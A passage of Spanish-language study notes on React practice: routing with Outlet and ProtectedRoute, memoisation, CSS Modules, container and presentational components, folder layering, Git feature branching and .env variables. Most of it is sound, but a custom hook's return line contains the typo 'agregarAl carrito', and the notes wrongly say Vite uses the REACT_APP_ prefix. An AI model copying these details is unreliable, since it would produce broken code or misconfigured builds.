y dentro de ese componente, el <Outlet> actúa como el punto de inyección para el contenido de las rutas hijas.

```
path="/dashboard" → Renderiza <LayoutDashboard> (contiene el sidebar estático).

path="perfil" → Renderiza <Perfil> dentro del <Outlet> de LayoutDashboard.
```

```
// El componente LayoutDashboard define la estructura visual estática.
<Route path="/dashboard" element={<LayoutDashboard />}>
    <Route path="perfil" element={<Perfil />} />
    <Route path="ajustes" element={<Ajustes />} />
</Route>
```


2. Rutas Wrapper y Componentes Protegidos (Composición de Lógica)
Utilizas la composición de rutas para envolver rutas con lógica
El componente ProtectedRoute es un ejemplo perfecto de esto.
ProtectedRoute (el padre) compone la lógica de autenticación alrededor de todas sus rutas hijas, protegiéndolas.

```
// ProtectedRoute contiene la lógica para verificar la autenticación
<Route element={<ProtectedRoute />}>
    <Route path="/privado" element={<DatosSecretos />} />
    <Route path="/checkout" element={<Checkout />} />
</Route>
```


3. Composición de Componentes de Alto Nivel
Componer tu routing separándolo en diferentes componentes funcionales (SRP aplicado).
En lugar de tener una sola lista gigante de <Route> en App.jsx, puedes tener componentes que definan subconjuntos de rutas.

```
// RutasAdministrativas.jsx
const RutasAdministrativas = () => (
    <Route path="admin" element={<LayoutAdmin />}>
        <Route path="usuarios" element={<GestionUsuarios />} />
        <Route path="logs" element={<VerLogs />} />
    </Route>
);

// App.jsx
function App() {
  return (
    <Routes>
      <Route path="/" element={<Home />} />
      <RutasAdministrativas /> {/* Composición de Rutas */}
    </Routes>
  );
}
```

Prácticas:

1. Composición de Rutas

2. Separar las Rutas en Componentes: 
Separa las configuraciones de rutas por dominio o característica (ej., /admin, /usuarios, /checkout) en archivos o componentes funcionales separados.
Ej: componente <AdminRoutes /> que define solo las rutas de administración

3. Manejar el Catch-All (404)
Siempre incluye una ruta catch-all con path="*" (o path="*") como la última ruta en tu componente <Routes>.
Esto atrapa cualquier URL no reconocida y renderiza la pág

4. Componente ProtectedRoute
Nunca añadas la lógica de autenticación directamente en los componentes de las páginas
En su lugar, crea un componente ProtectedRoute que utilice un <Outlet>
y el Hook useNavigate (o <Navigate>) para redirigir a los usuarios no autenticados.

5. Usar useNavigate vs. <Link>
<Link>: Úsalo siempre para la navegación declarativa (clics en menús, botones de navegación).
useNavigate

6. Usar replace: true con useNavigate
Después de acciones críticas como Iniciar Sesión o Enviar Pago, usa la opción { replace: true } con useNavigate.
Esto asegura que la página anterior se reemplace en el historial
impidiendo que el usuario regrese a la página de formulario o inicio de sesión con el botón "Atrás".

7. useParams para Identificación
acceder a los valores necesarios para identificar un recurso (ej. /productos/:id).

8. Usar useSearchParams para Filtros y Paginación
Utiliza useSearchParams (en lugar de useLocation().search) para leer y modificar los parámetros de consulta 
(query strings, ej. ?page=1&filtro=activo).
está diseñado para gestionar esto de forma sencilla, permitiendo mantener los parámetros existentes mientras añades o eliminas otros.

9. Normalizar Parámetros
Los valores de useParams y useSearchParams son siempre cadenas de texto (strings).
Si esperas un número, un booleano o un array, debes convertir el valor explícitamente (ej., Number(userId) o un parser de array).

10. Usar Lazy Loading (Code Splitting)
Para reducir el tamaño inicial del bundle de JavaScript y mejorar el tiempo de carga
utiliza la división de código (Code Splitting) para cargar los componentes de las rutas solo cuando sean necesarios
Esto se hace con React.lazy y <Suspense>.


Diseño de rutas

1. Seguir Restful
2. guiones medios
3. evitar extensiones y mayus
4. Uso de Rutas de Índice (index)
Utiliza la propiedad index en una ruta anidada
Define el contenido por defecto que se muestra cuando la URL coincide exactamente con la ruta padre
5. usar useParams
6. evitar Query Strings para Identificación 
7. centralizar rutas protegidas
8. evitar logica en query strins
9. constants File para apps grandes


SRP en rutas: 
1. composición siguiendo dominio
2. lógica de proteccion




## Re renderizado

Causa: la mutación del estado
El re-renderizado se dispara cuando el estado (useState, useReducer, Redux store, etc.) o las props de un componente cambian.
La práctica fundamental es asegurar que los cambios de estado sean inmutables.

Principio de Inmutabilidad: Nunca modifiques el estado u objetos directamente (ej. state.user.name = 'Nuevo').
evita que React detecte el cambio correctamente (porque la referencia de memoria es la misma), lo que puede llevar a bugs o re-renderizados incorrectos.

Copiar el Estado: Siempre crea una nueva copia del objeto o array al actualizar el estado, incluso si solo cambias una propiedad.
Objetos: Usa el operador spread ({ ...prevState, nuevaPropiedad: valor }).
Arrays: Usa el operador spread `[...prevArray, nuevoElemento]` 
o métodos que devuelven un nuevo array (.map(), .filter()).

Memorización:
técnica de almacenar en caché el resultado de una función o componente
y solo recalcularlo si sus entradas (dependencias) han cambiado.

### 1. Componentes con React.memo
Envuelve un Componente Presentacional o dumb component con React.memo().
Le dice a React que omita el re-renderizado de este componente
si sus props no han cambiado desde el render anterior.

```
export default React.memo(MiComponentePresentacional);
```

### 2. Valores con useMemo
Memoriza el resultado de una función o un valor costoso
Solo ejecuta la función si las dependencias en el array cambian
Esto es crucial si el valor es pasado como prop a un componente memorizado con React.memo.

```
// El cálculo solo se ejecuta si 'data' o 'filter' cambian
const filteredData = useMemo(() => expensiveFiltering(data, filter), [data, filter]);
```

### 3. Funciones con useCallback
Memoriza la definición de una función callback.
Asegura que la función mantenga la misma referencia de memoria entre renders
vital cuando pasas callbacks a componentes hijos optimizados con React.memo.
```
// La función solo se recrea si 'itemId' cambia
const handleClick = useCallback((itemId) => {
  console.log(`Item ${itemId} clicked`);
}, [itemId]);
```

Estado y lógica

State Colocation:
estado tan cerca del componente que lo necesita como sea posible.
##### Si un estado solo es relevante para un componente en el fondo del árbol
##### definirlo en un ancestro muy alto (como el componente App) forzará el re-renderizado de todo el árbol intermedio cuando ese estado cambie.

Evitar Renderizar en Cadena:
Evita actualizar el estado en el cuerpo principal de un componente 
o en useEffect sin un array de dependencias vacío

Si necesitas actualizar el estado basándote en un cálculo, hazlo de forma perezosa en la inicialización de useState (useState(() => valorInicial))
o asegúrate de que esté correctamente dentro de un useEffect con dependencias controladas.

Reducción del Ámbito con Selectores:
(Redux/Zustand): Si usas un gestor de estado global, utiliza selectores (useSelector en Redux).
Los selectores extraen solo la porción de estado que el componente necesita.
El componente solo se re-renderizará si esa porción específica de datos cambia, no si cambia cualquier otra cosa en el store global.

Problema de rendimiento:
##### Profiler de React DevTools: grabar y analizar el ciclo de vida de los componentes
##### mostrará exactamente qué componentes se están re-renderizando y por qué (o cuánto tiempo les toma
Why-Did-You-Render (Librería): Una librería externa que te notifica automáticamente en la consola cada vez que un componente se re-renderiza innecesariamente
indicando qué prop o estado cambió para causarlo.



## CSS

Atomic Design, Composición de Componentes
Dumb y Smart Components (logica renderizado), custom hook

components/ui/ o components/atoms/
components/layouts/ o components/templates/
pages/ o views/

Props de Estilo:
en ui components aceptando className o style como props (si es necesario
para sobrescribir el estilo desde el componente padre
ajustes de diseño sin tener que modificar el archivo original del componente.

Theming
conjunto de colores, tipografías y espaciados de forma centralizada (ej. theme.js).
Context API o librerias de ui
consistencia visual (ej. todos los botones primary tienen el mismo color, fuente y radio).

Memorización de Componentes Puros:
ui componenents que no cambian a menudo en React.memo
Si un componente presentacional recibe las mismas props entre re-renderizados del padre
React.memo evita que se re-renderice innecesariamente, mejorando el rendimiento.

Valores por Defecto/default props
const Boton = ({ children, onClick, disabled = false })

CSS Modules:
file.module.css

El build system (como Webpack o Vite) renombra automáticamente las clases, 
añadiendo un hash único al final (ej. Boton_primario__3aBcD).
Esto garantiza que la clase primario definida en tu Boton no afecte a una clase primario definida en Tarjeta.

##### Importa el objeto de estilos y accede a las clases como propiedades.

```
// Boton.jsx
import styles from './Boton.module.css';

const Boton = ({ children }) => (
  <button className={styles.primario}>
    {children}
  </button>
);
```


CSS-in-JS (Styled Components / Emotion):
Estiliza los componentes directamente en JavaScript, creando componentes de React con estilos adjuntos
Las librerías generan clases únicas en tiempo de ejecución o de compilación, aislando los estilos a nivel de componente
Útil para cuando necesitas que los estilos cambien dinámicamente según las props.

```
// 🟢 Boton.jsx
import styled from 'styled-components';

// Crea un componente que ya tiene estilos
const StyledButton = styled.button`
  background: ${props => props.$primary ? 'blue' : 'gray'};
  color: white;
  border-radius: 4px;
`;

const Boton = (props) => (
  <StyledButton {...props}>
    {props.children}
  </StyledButton>
);
```


Diseño Basado en Props:
Los componentes presentacionales deben ser flexibles 
y cambiar su apariencia basándose en las props que reciben.

1. Props de Variante (La Mejor Práctica)
Define un conjunto limitado y semántico de variantes de estilo que el consumidor puede elegir 
(ej. primary, secondary, outline).
El componente es fácil de usar y se adhiere a la guía de estilo de la aplicación.

```
// Boton.jsx
// El estilo de la clase se determina por la prop 'variant'
const Boton = ({ children, variant = 'default' }) => (
  <button className={`${styles.base} ${styles[variant]}`}>
    {children}
  </button>
);

// Uso:
<Boton variant="primary">Comprar</Boton>
```

2. Sobrescritura Controlada
Permite que el consumidor inyecte sus propias clases usando la prop className
para ajustes menores de layout (ej. margen o tamaño).
##### Acepta className y úsalo al final de la lista de clases para que el estilo del consumidor tenga prioridad.

```
// Boton.jsx
const Boton = ({ children, className }) => (
  <button className={`${styles.base} ${className}`}> 
    {children}
  </button>
);

// Uso: 
// El consumidor añade una clase de utilidad
<Boton className="mt-4">Finalizar</Boton>
```


Estilos Globales y Temas:

Consistencia tipografía, colores, fuente y espaciado

Variables CSS o tokens de diseño:

```
/* variables.css (o theme.css) */
:root {
  --color-primary: #007bff;
  --spacing-md: 1rem;
}

/* Boton.module.css */
.primario {
  background-color: var(--color-primary);
  padding: var(--spacing-md);
}
```

Componente ThemeProvider:
Si utilizas CSS-in-JS, define tu tema (ej. modo oscuro/claro) en un Contexto
expón un componente ThemeProvider que inyecte los valores a todos los componentes presentacionales.
Los estilos serán coherentes y reaccionarán a los cambios globales de tema.

Evitar Estilos Inline: Usa estilos inline (style={{ color: 'red' }}) solo para valores que son verdaderamente dinámicos (ej. animación, posición de un componente). 
Evítalos para estilos estáticos, ya que son difíciles de sobrescribir, no permiten pseudo-clases y no aprovechan el caching de las hojas de estilo.

Especificidad Baja: Cuando escribas CSS modular, intenta mantener la especificidad baja
Usa nombres de clases simples o anidamiento de componentes, en lugar de selectores complejos (div > p > a).

##### Clases Condicionales: Usa plantillas literales para aplicar clases condicionalmente basadas en el estado de la UI
(ej. disabled, active, open).

```
const MiInput = ({ isValid }) => (
  <input className={`${styles.input} ${isValid ? '' : styles.error}`} />
);
```


Componente presentacional

1. 

```
// TarjetaProducto.jsx

import React from 'react';
import PropTypes from 'prop-types';
import styles from './TarjetaProducto.module.css'; // Usando CSS Modules para aislamiento

/**
 * Componente presentacional que muestra los detalles de un producto.
 * Es totalmente controlado por sus props.
 */
const TarjetaProducto = ({ nombre, precio, stock, imagenUrl, onAgregarAlCarrito }) => {
  // Lógica de UI/Renderizado (qué mostrar basado en el stock)
  const isAvailable = stock > 0;
  
  return (
    <div className={styles.tarjeta}>
      <img src={imagenUrl} alt={nombre} className={styles.imagen} />
      
      <div className={styles.cuerpo}>
        <h3 className={styles.nombre}>{nombre}</h3>
        <p className={styles.precio}>${precio.toFixed(2)}</p>
        
        {/* Renderizado condicional basado en el estado de la UI */}
        <p className={isAvailable ? styles.stock : styles.sinStock}>
          {isAvailable ? `En stock: ${stock}` : 'Agotado'}
        </p>
        
        <button
          className={styles.boton}
          onClick={onAgregarAlCarrito} // Función callback recibida por props
          disabled={!isAvailable} // Lógica de UI: deshabilitar si no hay stock
        >
          {isAvailable ? 'Añadir al Carrito' : 'Sin Stock'}
        </button>
      </div>
    </div>
  );
};

// Buena Práctica: Definición explícita de props
TarjetaProducto.propTypes = {
  nombre: PropTypes.string.isRequired,
  precio: PropTypes.number.isRequired,
  stock: PropTypes.number.isRequired,
  imagenUrl: PropTypes.string,
  onAgregarAlCarrito: PropTypes.func.isRequired,
};

TarjetaProducto.defaultProps = {
  imagenUrl: '/placeholder.jpg',
};

export default TarjetaProducto;
```


2. Estilos Asociados (TarjetaProducto.module.css)

```
/* TarjetaProducto.module.css */

.tarjeta {
    border: 1px solid #ddd;
    border-radius: 8px;
    padding: 15px;
    max-width: 300px;
    text-align: center;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
}

.imagen {
    width: 100%;
    height: 150px;
    object-fit: cover;
    border-radius: 4px;
    margin-bottom: 10px;
}

.precio {
    font-size: 1.25rem;
    color: #007bff;
    font-weight: bold;
}

.stock {
    color: green;
    font-size: 0.85rem;
}

.sinStock {
    color: red;
    font-size: 0.85rem;
    font-weight: bold;
}

.boton {
    background-color: #28a745;
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 4px;
    cursor: pointer;
    margin-top: 10px;
    width: 100%;
}

.boton:disabled {
    background-color: #6c757d;
    cursor: not-allowed;
}
```


Componente Lógico:

1. Custom Hook

```
// hooks/useProducto.js
import { useState, useEffect } from 'react';
import axios from 'axios'; // Usaremos Axios para simular la API

// Custom Hook para gestionar el estado del producto
const useProducto = (id) => {
  const [producto, setProducto] = useState(null);
  const [cargando, setCargando] = useState(true);
  const [error, setError] = useState(null);
  
  // Lógica de negocio: Simulación de llamada a la API
  useEffect(() => {
    const fetchProducto = async () => {
      try {
        const res = await axios.get(`/api/productos/${id}`); // Llama a la API
        setProducto(res.data);
      } catch (err) {
        setError("No se pudo cargar el producto.");
      } finally {
        setCargando(false);
      }
    };
    fetchProducto();
  }, [id]); // Dependencia del ID
  
  // Lógica de Negocio: Simulación de la función de agregar al carrito
  const agregarAlCarrito = (idProducto) => {
      // Esta es la LÓGICA DE NEGOCIO real: 
      // Aquí se llamaría a Redux, Context o a otra API para añadir el ítem.
      console.log(`[LÓGICA DE NEGOCIO] Producto ID ${idProducto} añadido al carrito.`);
      // ... Llama a la API /carrito/add
      // ... Muestra una notificación Toast
  };

  // Devuelve el estado y las funciones de acción
  return { producto, cargando, error, agregarAl carrito };
};

export default useProducto;
```

2. Componente Lógico/Contenedor:  

##### usa el Custom Hook y decide qué mostrar (lógica de renderizado

```
// ContenedorProducto.jsx (Componente Lógico/Contenedor)

import React from 'react';
// Asumimos que el componente presentacional (TarjetaProducto) existe
import TarjetaProducto from '../components/presentacionales/TarjetaProducto'; 
import useProducto from '../hooks/useProducto';
import { useParams } from 'react-router-dom'; // Asumimos React Router

const ContenedorProducto = () => {
  // 1. Lógica de UI: Leer el ID del router
  const { id } = useParams(); 
  
  // 2. Lógica de Datos y Negocio: Usar el Custom Hook
  const { 
    producto, 
    cargando, 
    error, 
    agregarAlCarrito 
  } = useProducto(id); 

  // 3. Lógica de Renderizado (UI Logic)
  if (cargando) {
    return <h1>Cargando detalles del producto...</h1>;
  }

  if (error) {
    return <h1 style={{ color: 'red' }}>{error}</h1>;
  }

  if (!producto) {
      return <h1>Producto no encontrado.</h1>;
  }
  
  // 4. Delegación: Pasar los datos y las funciones de acción al presentacional
  return (
    <TarjetaProducto
      nombre={producto.nombre}
      precio={producto.precio}
      stock={producto.stock}
      imagenUrl={producto.imagen}
      
      // Se pasa la función de LÓGICA DE NEGOCIO como callback
      onAgregarAlCarrito={() => agregarAlCarrito(producto.id)} 
    />
  );
};

export default ContenedorProducto;
```


Aplicación de css modules:

1. Creación del Archivo de Estilos
Nombra tu archivo usando la convención .module.css (o .module.scss).

```
/* Button.module.css */

.base {
    padding: 10px 15px;
    border-radius: 4px;
    cursor: pointer;
}

.primary {
    background-color: #007bff;
    color: white;
    border: none;
}
```


2. Importación y Aplicación en JSX
##### Importas los estilos como si fueran un objeto JavaScript
##### usas la sintaxis de plantillas literales para combinar clases.
 
 ```
 // Button.jsx
import React from 'react';
// Importa los estilos como un objeto 'styles'
import styles from './Button.module.css'; 

const Button = ({ children, variant = 'primary', className }) => {
  // 1. Accede a las clases usando la notación de objeto (styles.base, styles.primary)
  // 2. Combina las clases modulares con las props externas (className)
  return (
    <button className={`${styles.base} ${styles[variant]} ${className || ''}`}>
      {children}
    </button>
  );
};

export default Button;
 ```
 
3. Resultado en el DOM
Si inspeccionas el elemento, verás el nombre de clase único generado, garantizando que no habrá colisiones con otros componentes.

```
<button class="Button_base__aE1pC Button_primary__zY2wD ...">
  Comprar
</button>
```







## Lógica de ui

qué se muestra, cuándo se muestra y cómo se optimiza la visualización de la ui

Renderizado Condicional Explícito:

```
// Lógica de renderizado separada
if (isLoading) return <Spinner />;
if (error) return <ErrorMessage message={error} />;
return <ItemList items={data} />;

```

Lógica de Renderizado en Funciones: subsecciones
subsección de la UI que se renderiza condicionalmente o que tiene una lógica compleja
crea una función auxiliar dentro del componente que devuelva el JSX (iu component)

```
const renderEstadoPedido = (estado) => {
  switch (estado) {
    case 'PENDIENTE': return <Tag variant="warning">Pendiente</Tag>;
    case 'ENVIADO': return <Tag variant="info">Enviado</Tag>;
    default: return <Tag variant="success">Completado</Tag>;
  }
};
// ...
return <div>{renderEstadoPedido(pedido.status)}</div>;
```

Early Returns:
return tan pronto como se cumpla una condición crítica
(ej. el componente está cargando, hay un error, o no hay datos).
la lógica principal de renderizado solo se ejecuta cuando todas las condiciones iniciales están satisfechas.

Memorización de Componentes Puros: React.memo
Envuelve los componentes presentacionales (aquellos que solo reciben props y no tienen estado ni efectos secundarios complejos) en React.memo.
Condición: Solo se re-renderizarán si sus props cambian.
Esto es vital para listas grandes o componentes complejos.

useMemo y useCallback:
useMemo para memorizar valores
useCallback para memorizar funciones
##### Propósito: Evitar que se creen nuevas referencias en cada render, lo cual rompería la optimización de React.memo en los componentes hijos.

Listas con key
Cuando renderices una lista de elementos (.map())
usa una clave (key) que sea estable y única dentro de la lista 
(idealmente un id de la API).
Permite que React identifique qué elementos han cambiado, añadido o eliminado
##### Nunca uses el índice del array (i) como clave si la lista puede cambiar de orden.

Componente de Estado de Carga:
Práctica: Crea un componente presentacional dedicado (ej. <Loading /> o <Spinner />) y un componente de error (<ErrorMessage />).
Razón: La lógica que decide si mostrar el contenido, el spinner o el error es lógica de renderizado
debe estar separada de la lógica de negocio y presentación del contenido principal.

Lógica de Presentación en Custom Hooks:
Práctica: Si tienes una lógica de UI reutilizable (ej. lógica de paginación, alternar un modal),
extráela a un Custom Hook (ej. usePagination, useToggle).
Razón: Deja el componente principal limpio y fácil de leer, y permite la reutilización de esa lógica

```
// Custom Hook para lógica de UI
const useToggle = (initialValue = false) => {
  const [value, setValue] = useState(initialValue);
  const toggle = useCallback(() => setValue(prev => !prev), []);
  return [value, toggle];
};

// Componente de UI limpio
const MiModal = () => {
  const [isOpen, toggleOpen] = useToggle(false); // Lógica de UI abstraída
  // ...
};
```


## Diseño responsivo



## Diseño de capas

Lógica de la Interfaz de Usuario (UI)
Lógica de la Aplicación
Gestión del Estado


1. UI

Se enfoca exclusivamente en cómo se ve la aplicación
Contiene los componentes más genéricos, reusables y que no contienen lógica de negocio.

Sub-capa 1: 
Componentes Atómicos/Presentacionales (Dumb/Tontos)
##### Piezas básicas de la UI (botones, inputs, tarjetas, iconos).
Reciben datos y funciones solo a través de props.
No conocen el estado global ni hacen llamadas a API.

Tech: Solo React, CSS/Styled-Components.

Sub-capa 2:
Páginas/Diseños
##### Componentes que definen la estructura principal de la aplicación (layouts).
Orquestan los componentes atómicos y contenedores
Su lógica es mínima.

Tech: React, React Router.


2. Lógica de la Aplicación y Estado (Contenedores)

Se enfoca en qué hace la aplicación y en la lógica de negocio

Sub-capa 1:
Componentes Contenedor/Inteligentes (Smart):
##### Componentes que son responsables de la lógica de negocio
La gestión de estado y la comunicación con las capas de datos
Pasan los datos y las funciones a los componentes presentacionales.

React, Hooks (useState, useReducer)
Context API, Redux/Zustand.

Sub-capa 2:
Custom Hooks
##### Encapsulan la lógica de estado y efectos (data fetching, timers, validación) para hacerla reusable
aislando la lógica de negocio de la UI.

useReducer, useMemo, useCallback, useEffect.


3. Gestión de Datos (Servicios/APIs)

Capa encargada de la comunicación con el exterior y de la transformación de dato
Aísla tu frontend de los detalles de la fuente de datos.

Sub-capa 1:
Servicios / API Clients
##### Contiene funciones para hacer llamadas HTTP (GET, POST, etc.) a tu backend
Se encarga de la configuración de headers, tokens, y maneja errores de red.

fetch, Axios, RTK Query, React Query/TanStack Query.

Sub-capa 2: 
Modelos/Tipos
##### Define la estructura de los datos esperados
Vital para la robustez y el tipado (TypeScript).
TypeScript, Zod.


Directorios: 

Basada en características/funcionalidad (features)

##### Reflejar el diseño de capas en los directorios y archivos
##### Reflejar el modelo en el código

Ej 1:

```
/src
├── /api                 <-- 3. Capa de Gestión de Datos (API Clients)
│   └── productosService.js
│   └── authService.js
├── /hooks               <-- 2. Capa de Lógica (Custom Hooks)
│   └── useAuth.js
│   └── useFetch.js
├── /components
│   ├── /ui              <-- 1. Capa de UI (Componentes Atómicos/Tontos)
│   │   └── Boton.jsx
│   │   └── Input.jsx
│   └── /feature         <-- 2. Capa de Lógica (Componentes Contenedores)
│       └── /ListaProductos
│           ├── ListaProductos.jsx  (Contenedor: hace fetch, gestiona estado)
│           └── ProductoCard.jsx    (Presentacional: recibe props)
├── /pages               <-- 1. Capa de UI (Páginas/Rutas)
│   └── HomePage.jsx
│   └── ProfilePage.jsx
└── /store               <-- 2. Capa de Lógica (Estado Global)
    └── authSlice.js
```

##### Mantenimiento: Si cambias tu backend (ej. cambias de API REST a GraphQL), solo tienes que modificar la Capa de Gestión de Datos, sin tocar la lógica de la UI o de la aplicación


Ej 2:

```
/src
├── /api
│   └── index.js             // Configuración de la instancia de Axios/fetch
│   └── authService.js       // Funciones para llamadas a API de autenticación
│   └── productosService.js  // Funciones para llamadas a API de productos
│
├── /assets                  // Recursos estáticos (imágenes, fuentes, videos)
│
├── /components              // 1. CAPA DE INTERFAZ DE USUARIO (UI)
│   ├── /ui                  // Componentes Atómicos/Presentacionales (Tontos)
│   │   └── Boton.jsx        // <Boton onClick={...} color="primary" />
│   │   └── Input.jsx        // <Input type="text" label="Email" />
│   │   └── Card.jsx
│   │   └── Icono.jsx
│   │
│   └── /layouts             // Componentes que definen la estructura (ej. Cabecera, Pie de página)
│       └── MainLayout.jsx
│       └── Header.jsx
│
├── /features                // 2. CAPA DE LÓGICA Y ESTADO (Por Característica)
│   ├── /auth                // Módulo de Autenticación
│   │   └── components
│   │   │   └── LoginForm.jsx // Contenedor (maneja la lógica de envío)
│   │   └── hooks
│   │   │   └── useLogin.js   // Custom Hook para la lógica de login/fetch
│   │   └── pages
│   │       └── LoginPage.jsx // Página que usa el Contenedor
│   │
│   └── /productos           // Módulo de Productos
│       └── components
│       │   └── ListaProductos.jsx // Contenedor (hace fetch, filtra)
│       │   └── ProductoCard.jsx   // Presentacional (recibe producto por prop)
│       └── hooks
│           └── useProductos.js // Custom Hook de fetching y estado
│       └── pages
│           └── ProductsPage.jsx
│
├── /hooks                   // 2. CAPA DE LÓGICA (Custom Hooks Globales)
│   └── useLocalStorage.js   // Ej. Lógica reutilizable por toda la app
│   └── useToggle.js
│
├── /store                   // 2. CAPA DE LÓGICA (Estado Global - Redux/Context)
│   └── authSlice.js         // Reducer/Slice para el estado de autenticación
│   └── productsSlice.js
│   └── context              // Alternativa para Context API
│       └── AuthContext.js
│
├── /utils                   // Funciones de ayuda sin lógica de React
│   └── formatters.js        // Funciones de formato de fechas, monedas
│   └── validators.js        // Funciones de validación de datos
│
├── App.jsx                  // Punto de entrada principal (manejo de rutas y Providers)
└── main.jsx                 // Montaje de la aplicación (entry point)
``` 



## Git

### Git/github flow: Feature Branching

##### Se basa en mantener una rama central (main o master) siempre estable y lista para producción.

1. Clonar y Mantener la Rama Principal

Rama main (o master) es la fuente de la verdad y representa el código de producción.

Clonar el proyecto
git clone url

Asegurar rama principal
git checkout main
Siempre trabaja sobre la versión más reciente.

Actualizar main
git pull origin main
##### Siempre haz un pull antes de crear una rama nueva.


2. Crear y Trabajar en rama Feature

##### Cada nueva tarea, corrección de bug o característica debe tener su propia rama de corta duración.

Crear y cambiar
git checkout -b feature/nombre-de-la-tarea
Usa prefijos (ej. feature/, bugfix/) y nombres descriptivos y concisos.

Hacer cambios
(Modifica archivos, escribe código)
Trabaja de forma aislada.

Hacer commits
git commit -am "feat: mensaje descriptivo conciso"


-a / --all: Esta opción prepara automáticamente todos los archivos modificados y eliminados con seguimiento antes de la confirmación
Combina eficazmente git add -u con git commit. 
Los archivos sin seguimiento no se incluyen

git add -A = git add . + git add -u

git add .
agrega todos los archivos (existentes, modificados y nuevos) al área de almacenamiento temporal
pero no elimina los archivos que se han eliminado del disco.

git add -u
solo agrega los archivos rastreados actualmente (que han sido modificados) al área de preparación
y también verifica si se han eliminado (en caso afirmativo, se eliminan del área de preparación)
Esto significa que no prepara los archivos nuevos.


Enviar cambios
git push origin feature/nombre-de-la-tarea
Haz push con frecuencia como backup y para colaborar.


3. Sincronización y Preparación del Pull Request (PR)

##### Antes de fusionar tus cambios, debes asegurarte de que tu rama está actualizada con main.

Volver al main
git checkout main
Navega a la rama base.

Actualizar main
git pull origin main
Descarga los últimos cambios de otros.

Volver a tu feature
git checkout feature/nombre-de-la-tarea
Regresa a tu rama.


Integrar main
git rebase main
Recomendación: rebase ofrece un historial limpio y lineal.

Alternativamente, usa git merge main si prefieres mantener los commits de fusión.

Forzar push
git push --force-with-lease
Solo si usaste rebase y tu rama ya estaba en el remote
El flag --force-with-lease es más seguro que --force.


4. Revisión, Fusión y Limpieza

##### Una vez que los cambios están listos y revisados, se fusionan y la rama se elimina.

Crear PR
(Usar GitHub/GitLab/Bitbucket UI)
Siempre solicita una revisión de código (Code Review).

Fusionar
(Usar el botón Squash and Merge en la UI)
Recomendación: Squash and Merge comprime todos los commits de tu feature en un solo commit limpio en main.

Eliminar rama local
git branch -d feature/nombre-de-la-tarea
Limpia tu entorno. 
Usa -D si hay commits sin fusionar.

Eliminar rama remota
git push origin --delete feature/nombre-de-la-tarea
Limpia el servidor remoto.



### Prácticas

1. Mensajes de Commit Limpios

Imperativo y Conciso: "Fix: corrige el error de cálculo"

Convencional: Usa prefijos estándar:
feat: Nueva característica.
fix: Corrección de un bug.
docs: Cambios en la documentación.
refactor: Refactorización sin cambio de funcionalidad.
chore: Mantenimiento (ej. actualización de dependencias).


2. .gitignore

##### Excluye siempre: Archivos de build (/dist, /build), carpetas de dependencias (/node_modules), credenciales y configuraciones locales (.env).
Comando: Crea un archivo .gitignore en la raíz del proyecto.


3. rebase vs merge

git rebase (Recomendado):
Mueve tu rama feature encima de main
Crea un historial limpio, lineal y fácil de leer.

##### Nunca hagas `rebase` en ramas compartidas o públicas

git merge (Alternativa):
Fusiona las ramas, manteniendo un commit de fusión y un historial no lineal
##### Es más seguro para ramas compartidas.


4. Limpieza del historial local

git commit --amend
Útil para modificar el último commit
cambiar el mensaje o añadir un archivo olvidado
antes de hacer push.

git reset
Útil para deshacer o mover el HEAD (usar con cuidado).

git reset HEAD~1: Deshace el último commit, manteniendo los cambios en tu área de staging.

git reset --hard commit-hash: Borra permanentemente todos los cambios locales hasta el commit especificado.




### Conventional Commits



## Entorno local/vars (.env)

##### Cruciales para gestionar configuraciones que cambian entre los diferentes entornos de despliegue
(desarrollo, staging, producción) sin modificar el código fuente.

### 1. Variables para Entornos y Rutas
##### Estas variables definen cómo se comporta la aplicación en diferentes entornos.

Variable Valor

NODE_ENV | valor: development / production
Obligatoria
Define el entorno actual (development, production, o test).
React y muchas librerías la usan para activar optimizaciones o logging

REACT_APP_API_URL | http://localhost:8080/api/v1
La URL base de tu servicio backend o API REST
Permite cambiar el entorno de API (local, staging, producción) sin recompilar el código.

REACT_APP_WEBSOCKET_URL | ws://localhost:8080/ws
URL base para la conexión de WebSockets (si se utiliza).

PUBLIC_URL | /mi-app/
A menudo configurada por la herramienta de build
Ruta base donde se sirve la aplicación
(útil para despliegues en subdirectorios).


### 2. Variables de Claves y Servicios Externos

##### Estas variables contienen las claves públicas necesarias para interactuar con servicios de terceros.
React expone estas variables al navegador
##### Nunca almacenes claves secretas de servidor
(como SECRET_KEY de Stripe o contraseñas de bases de datos)
##### en el frontend, solo claves públicas.

REACT_APP_AUTH_CLIENT_ID | 12345-abcdefg.apps.googleusercontent.com
ID de cliente público de un servicio de autenticación
(ej. Google Auth, Auth0, Cognito).

REACT_APP_MAPS_API_KEY | AIzaSyB-xxxxxx
Clave pública para servicios de mapas
(ej. Google Maps, Mapbox).

REACT_APP_ANALYTICS_ID | UA-12345678-1
ID de seguimiento para herramientas de análisis
(ej. Google Analytics, Plausible).

REACT_APP_SENTRY_DSN | https://xxxxxx.sentry.io/xxxxxx
Clave de DSN para el seguimiento de errores de runtime
(ej. Sentry).


### 3. Variables de Configuración de la Aplicación

##### Parámetros que modifican el comportamiento o las características de la aplicación.

REACT_APP_FEATURE_BETA | true / false
Flags para habilitar o deshabilitar ciertas funcionalidades que están en prueba (Feature Flags).

REACT_APP_TIMEOUT_MS | 5000
Tiempo de espera máximo (en milisegundos) para las solicitudes a la API.

REACT_APP_CACHE_DURATION_HRS | 24
Duración del cache para ciertos datos persistentes en el navegador (si se usa).

REACT_APP_VERSION | 1.5.3
Versión de la aplicación que se está ejecutando
(útil para debugging o para mostrar en el footer).


### Configuración en React

1. Prefijo Obligatorio

En las configuraciones de build más comunes de React como Vite
##### Solo se exponen las variables de entorno al código fuente
##### si comienzan con un prefijo específico, generalmente REACT_APP_.

REACT_APP_API_URL: Accesible en código como: 
process.env.REACT_APP_API_URL.

API_URL: No accesible en código (permanece solo a nivel del servidor de build).


2. Múltiples Archivos .env

##### Para gestionar diferentes entornos, es una buena práctica usar archivos .env específicos: 

.env	Valores por defecto que se aplican a todos los entornos (siempre se carga).
.env.development	Sobrescribe valores solo para el entorno de desarrollo (NODE_ENV=development).
.env.production	Sobrescribe valores solo para el entorno de producción (NODE_ENV=production).
##### .env.local	Configuración personal que nunca debe ser subida a Git (útil para credenciales locales o configuraciones específicas de la máquina).


### Vite env




## Desestructuración

Desempaquetar valores de arrays y objetos para asignarlos a variables de forma concisa y legible


### Arrays

